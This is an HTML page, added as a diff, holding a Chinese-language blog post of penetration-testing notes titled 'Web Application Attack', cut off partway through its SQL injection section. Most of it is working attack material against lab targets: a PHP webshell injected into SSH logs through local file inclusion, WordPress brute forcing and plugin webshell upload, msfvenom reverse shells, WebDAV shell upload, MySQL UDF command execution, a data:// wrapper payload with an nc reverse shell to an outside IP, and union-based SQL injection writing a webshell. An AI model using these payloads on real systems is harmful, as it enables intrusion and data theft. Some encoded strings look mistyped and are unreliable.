@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Web拿权限文件包含漏洞结合访问日志达到RCE假设有个LFI 1http:&#x2F;&#x2F;192.168.237.80&#x2F;console&#x2F;file.php?file&#x3D;&#x2F;etc&#x2F;passwd  然后拿到了natraj 和 mahakal两个用户名，尝试SSH爆破无果 然后尝试去读取两个用户目录下的id_rsa文件，也失败了 尝试去读取机器上的登录日志文件，Linux上的登录日志文件在&#x2F;var&#x2F;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Web Application Attack">
+<meta property="og:url" content="http://example.com/2024/06/05/Web-Application-Attack/index.html">
+<meta property="og:site_name" content="B00ze Escape">
+<meta property="og:description" content="Web拿权限文件包含漏洞结合访问日志达到RCE假设有个LFI 1http:&#x2F;&#x2F;192.168.237.80&#x2F;console&#x2F;file.php?file&#x3D;&#x2F;etc&#x2F;passwd  然后拿到了natraj 和 mahakal两个用户名，尝试SSH爆破无果 然后尝试去读取两个用户目录下的id_rsa文件，也失败了 尝试去读取机器上的登录日志文件，Linux上的登录日志文件在&#x2F;var&#x2F;">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-06-05T06:35:58.000Z">
+<meta property="article:modified_time" content="2024-06-05T06:44:53.033Z">
+<meta property="article:author" content="yu1e">
+<meta property="article:tag" content="Pentest">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Web Application Attack</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/yu1e">项目</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2024/06/05/Tunnel-Technology/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2024/06/05/Windows-Privilege-Escalation/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/06/05/Web-Application-Attack/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/06/05/Web-Application-Attack/&text=Web Application Attack"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/06/05/Web-Application-Attack/&title=Web Application Attack"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/06/05/Web-Application-Attack/&is_video=false&description=Web Application Attack"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Web Application Attack&body=Check out this article: http://example.com/2024/06/05/Web-Application-Attack/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/06/05/Web-Application-Attack/&title=Web Application Attack"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/06/05/Web-Application-Attack/&title=Web Application Attack"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/06/05/Web-Application-Attack/&title=Web Application Attack"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/06/05/Web-Application-Attack/&title=Web Application Attack"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/06/05/Web-Application-Attack/&name=Web Application Attack&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/06/05/Web-Application-Attack/&t=Web Application Attack"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web%E6%8B%BF%E6%9D%83%E9%99%90"><span class="toc-number">1.</span> <span class="toc-text">Web拿权限</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%BB%93%E5%90%88%E8%AE%BF%E9%97%AE%E6%97%A5%E5%BF%97%E8%BE%BE%E5%88%B0RCE"><span class="toc-number">1.1.</span> <span class="toc-text">文件包含漏洞结合访问日志达到RCE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9B%AE%E5%BD%95"><span class="toc-number">2.</span> <span class="toc-text">常见目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-number">3.</span> <span class="toc-text">目录扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WordPress"><span class="toc-number">4.</span> <span class="toc-text">WordPress</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WebDav"><span class="toc-number">5.</span> <span class="toc-text">WebDav</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MySQL-UDF%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">6.</span> <span class="toc-text">MySQL UDF执行命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">7.</span> <span class="toc-text">文件包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">8.</span> <span class="toc-text">伪协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">9.</span> <span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-number">9.1.</span> <span class="toc-text">盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-number">10.</span> <span class="toc-text">命令注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">11.</span> <span class="toc-text">其他</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Web Application Attack
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">yu1e</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-06-05T06:35:58.000Z" class="dt-published" itemprop="datePublished">2024-06-05</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Pentest/" rel="tag">Pentest</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Web拿权限"><a href="#Web拿权限" class="headerlink" title="Web拿权限"></a>Web拿权限</h2><h3 id="文件包含漏洞结合访问日志达到RCE"><a href="#文件包含漏洞结合访问日志达到RCE" class="headerlink" title="文件包含漏洞结合访问日志达到RCE"></a>文件包含漏洞结合访问日志达到RCE</h3><p>假设有个LFI</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.237.80/console/file.php?file=/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>然后拿到了natraj 和 mahakal两个用户名，尝试SSH爆破无果</p>
+<p>然后尝试去读取两个用户目录下的id_rsa文件，也失败了</p>
+<p>尝试去读取机器上的登录日志文件，Linux上的登录日志文件在&#x2F;var&#x2F;log&#x2F;auth.log</p>
+<p>后面就是使用LFI 和 SSH 登录日志文件达到RCE的效果</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh &#x27;&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;&#x27;@192.168.237.80</span><br></pre></td></tr></table></figure>
+
+<p>这里有个问题，就是SSH在升级之后是不允许使用此类用户名，只能用msf里的auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_login，设置用户名和密码，密码随意，然后run</p>
+<p>然后访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.212.80/console/file.php?file=/var/log/auth.log&amp;&amp;cmd=id</span><br></pre></td></tr></table></figure>
+
+<p>上php马，拿到shell</p>
+<h2 id="常见目录"><a href="#常见目录" class="headerlink" title="常见目录"></a>常见目录</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/robots.txt</span><br><span class="line">/sitemap.xml</span><br><span class="line">/humans.txt</span><br><span class="line"></span><br><span class="line">tomcat /manager/html</span><br><span class="line">phpmyadmin /phpmyadmin</span><br></pre></td></tr></table></figure>
+
+<h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-r表示非递归爆破目录，-z表示每次请求增加10毫秒延时</span></span><br><span class="line">dirb http://www.megacorpone.com/ admin.txt -r -z 10</span><br><span class="line">dirsearch -u $URL -f -e php,txt,html</span><br><span class="line">dirsearch -u $URL -f -e php,txt,html -w /user/share/seclists/...</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用hakrawler爬取页面所有链接</span></span><br><span class="line">echo &quot;https://xxx.xxx&quot; | hakrawler</span><br></pre></td></tr></table></figure>
+
+<p>有的网页会设置Anti CSRF token，也就是发送一次请求，返回的数据中会带有一个token，下次请求就必须带上这个token进行请求，否则不会校验密码，具体怎么绕过进行爆破网上很多教程</p>
+<h2 id="WordPress"><a href="#WordPress" class="headerlink" title="WordPress"></a>WordPress</h2><p>扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># wpscan</span><br><span class="line">只能扫首页，不是登录页面</span><br><span class="line">wpscan --url http://blogger.thm/assets/fonts/blog/ --enumerate p --plugins-detection aggressive</span><br><span class="line">wpscan --url sandbox.local --enumerate ap,at,cb,dbe</span><br><span class="line">wpscan --api-token $wPSCAN_KEY --url http:/llsandbox.local/wp -e</span><br><span class="line"># 爆破</span><br><span class="line">wpscan --url http://$IP/wp/wp-login.php -U Admin --passwords /usr/share/wordlists/rockyou.txt --password-attack wp-login</span><br></pre></td></tr></table></figure>
+
+<p>扫出来的结果看版本、看插件</p>
+<p>搜索wp的插件漏洞</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -update</span><br><span class="line">searchsploit elementor</span><br><span class="line">searchsploit ocear-extra</span><br><span class="line">searchsploit wp-survey-and-poll</span><br><span class="line">searchsploit ocean</span><br><span class="line">searchsploit survey poll</span><br></pre></td></tr></table></figure>
+
+<p>如果拿到了wp的密码密文，丢到爆破里</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;$PASS&#x27; &gt; pass.txt</span><br><span class="line">john --wordlist=rockyou.txt pass.txt</span><br></pre></td></tr></table></figure>
+
+<p>然后登录后台，上传插件的webshell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install seclists # 包含wp插件</span><br><span class="line">ls /usr/share/seclists/Web-Shells/WordPress</span><br><span class="line">sudo zip plugin-shell.zip plugin-shell.php</span><br></pre></td></tr></table></figure>
+
+<p>然后执行wget从攻击机下载回弹shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p xxx LHOST=xxx LPORT=xxx -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>
+
+<p>然后去web目录下找配置文件里的数据库账号密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/web-config.php</span><br></pre></td></tr></table></figure>
+
+<h2 id="WebDav"><a href="#WebDav" class="headerlink" title="WebDav"></a>WebDav</h2><p>技巧</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav</span><br></pre></td></tr></table></figure>
+
+<p>nmap扫描结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">80/tcp    open  http          Microsoft IIS httpd 10.0</span><br><span class="line">| http-webdav-scan: </span><br><span class="line">|   WebDAV type: Unknown</span><br><span class="line">|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK</span><br></pre></td></tr></table></figure>
+
+<p>漏洞利用</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=80 -f aspx -o shell.aspx</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -T &#x27;shell.aspx&#x27; &#x27;http://$VictimIP/&#x27; -u &lt;username&gt;:&lt;password&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后访问网马，本地开监听</p>
+<h2 id="MySQL-UDF执行命令"><a href="#MySQL-UDF执行命令" class="headerlink" title="MySQL UDF执行命令"></a>MySQL UDF执行命令</h2><p>UDF的库文件位于</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">locate lib_mysqludf_sys.so # linux</span><br><span class="line">locate lib_mysqludf_sys.dll #windows</span><br></pre></td></tr></table></figure>
+
+<p>生成库文件的二进制流</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxd -p lib_mysqludf_sys.so | tr -d &#x27;\n&#x27; &gt; lib_mysqludf_sys.so.hex</span><br></pre></td></tr></table></figure>
+
+<p>用hex文件内容传入MySQL变量shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Mysql执行</span></span><br><span class="line">set @shell = xxxxxxx;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看插件目录、文件操作权限</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">mysql执行</span></span><br><span class="line">show variables like &#x27;%plugin%&#x27;;</span><br><span class="line">show variables like &#x27;%secure_file_priv%&#x27;; # 如果没有权限写入插件目录，那就不能用UDF执行系统命令</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果有权限</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">mysql执行</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将二进制shellcode转储到插件目录文件</span></span><br><span class="line">select binary @shell into dumpfile &#x27;/home/dev/plugin/udf_sys_exec.so&#x27;;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">利用库文件创建MySQL函数</span></span><br><span class="line">create function sys_exec returns int soname &#x27;udf_sys_exec.so&#x27;;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">验证函数创建成功</span></span><br><span class="line">select * from mysql.func where name=&#x27;sys_exec&#x27;;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">攻击机执行msfconsole，使用/exploit/multi/handler</span></span><br><span class="line">set PAYLOAD linux/x86/meterpreter/reverse_tcp</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">被控机器上下载shell并执行</span></span><br><span class="line">select sys_exec(&#x27;wget ...&#x27;)</span><br></pre></td></tr></table></figure>
+
+<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>污染日志文件，如果知道目标主机的日志目录，比如ssh日志，这个时候去用php一句话作为用户名去连接目标主机，日志文件中就会有PHP一句话，然后再用文件包含去执行php的webshell，或者是web日志也可</p>
+<p>前提是知道日志路径、日志路径可写、可以跨web目录去进行文件包含</p>
+<p>或者可以在服务器上搭建一个webshell，然后文件包含去访问</p>
+<p>Windows下文件包含要用\</p>
+<p>有时候执行命令的get参数用？不行的话，可以试一下&amp;</p>
+<p>%00截断，在某些情况下有效，可以在要包含的文件如&#x2F;etc&#x2F;passwd后面加上%00去截断</p>
+<p>..&#x2F;被过滤，将..&#x2F;进行url编码，即%2e%2e%2f，或者试一下….&#x2F;</p>
+<p>文件包含也可以结合文件上传来利用，上传一个png，png里是webshell</p>
+<h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">支持明文和Base64编码数据</span><br><span class="line"></span><br><span class="line">http://10.11.0.22/menu.php?file=data:text/plain,hello world</span><br><span class="line"></span><br><span class="line">不指定文件，直接把代码当作PHP解析</span><br><span class="line">http://10.11.0.22/menu.php?file=data:text/plain,&lt;?php echo shell_exec(&quot;id&quot;)?&gt;</span><br><span class="line">data:/textiplain;base64,PD9waHAgHZhcj1zaGVsbF9leGVjKCRfROVUWydjbWQnXSk7IGVjaG8gJHZhciA/Pg==&amp;cmd=id</span><br><span class="line"></span><br><span class="line">base64编码，绕过过滤</span><br><span class="line">data://text/plain;base64,PD9waHAgJHZhcj1zaGVsbF9leGVjKCRfROVUWydjbwQnXSk7IGVjaG8gJHZhciA/Pg==&amp;cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f(/bin/sh+-i+2&gt;%261/nc+10.58.106.1+3333+&gt;/tmplf</span><br></pre></td></tr></table></figure>
+
+<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>‘单引号是从前往后成对匹配的</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;select * from users where username=&#x27;&#x27;&#x27; and password=&#x27;password123&#x27;&quot;;</span><br><span class="line">#最后的单引号多出来了</span><br></pre></td></tr></table></figure>
+
+<p>万能密码 tom’ or 1&#x3D;1</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;tom&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>;# <span class="string">&#x27;and password = &#x27;</span>jones<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">select * from users where name = &#x27;</span>tom<span class="string">&#x27; or 1=1 LIMIT 1;#如果上一个用不了，加上LIMIT 1试一下</span></span><br></pre></td></tr></table></figure>
+
+<p>先确定是不是字符型，如果返回的报错信息里有’单引号，那么很可能是字符型</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">error near &#x27;xxxxxx&#x27;&#x27;#最前面和最后面的单引号不算</span><br><span class="line">error near &#x27;&#x27;&#x27;&#x27;&#x27; </span><br><span class="line"></span><br><span class="line">如果报错是</span><br><span class="line">error near &#x27; \&#x27; &#x27;</span><br><span class="line">就是数值型，并且服务器转义</span><br></pre></td></tr></table></figure>
+
+<p>可以用limit来指定要取哪一条数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">limit a,b#表示以a为起始索引，取b个</span><br></pre></td></tr></table></figure>
+
+<p>然后推测后端查询语句的大概逻辑，比如这里是字符型</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,email <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;$input&#x27;</span>;</span><br><span class="line">那么就可以构造</span><br><span class="line"><span class="keyword">select</span> username,email <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;1 or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure>
+
+<p>再使用order by推测select后面是有几个字段，即select xxx 这里的xxx有几个字段，因为后续要用联合查询去查别的表。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> fname, sname,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">5</span># <span class="string">&#x27; ;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果order by 4没报错，by 5报错了，那么就是4个字段</p>
+<p>或者用union select也可以判断</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> fname,sname frem users <span class="keyword">where</span> id<span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span># <span class="string">&#x27; ;</span></span><br><span class="line"><span class="string">#查数据库名</span></span><br><span class="line"><span class="string">select fname,sname frem users where id= &#x27;</span><span class="number">1</span><span class="string">&#x27; union select version(),database()# &#x27;</span> ;</span><br></pre></td></tr></table></figure>
+
+<p>查指定数据库的所有表名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> fname,name <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span> <span class="string">&#x27; &#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> table_name,<span class="number">2</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;dvwa&#x27;</span>#<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>查指定表的所有字段名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> fname,name <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> column_name,<span class="number">2</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;dvwa&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>#</span><br></pre></td></tr></table></figure>
+
+<p>查指定数据库下的表的所有字段的数据</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> fname,name <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">user</span>, password <span class="keyword">from</span> dvwa.users#</span><br></pre></td></tr></table></figure>
+
+<p>读取敏感文件</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,load_file(<span class="string">&#x27;/etc/passwd&#x27;</span>)#</span><br></pre></td></tr></table></figure>
+
+<p>写入webshell</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,&quot;php shell&quot; <span class="keyword">INTO</span> DUMPFILE <span class="string">&#x27;/var/www/htm1/shell.php&#x27;</span>#</span><br></pre></td></tr></table></figure>
+
+<p>绕过服务器转义</p>
+<p>比如注入table_schema&#x3D;’xxx’的时候报错</p>
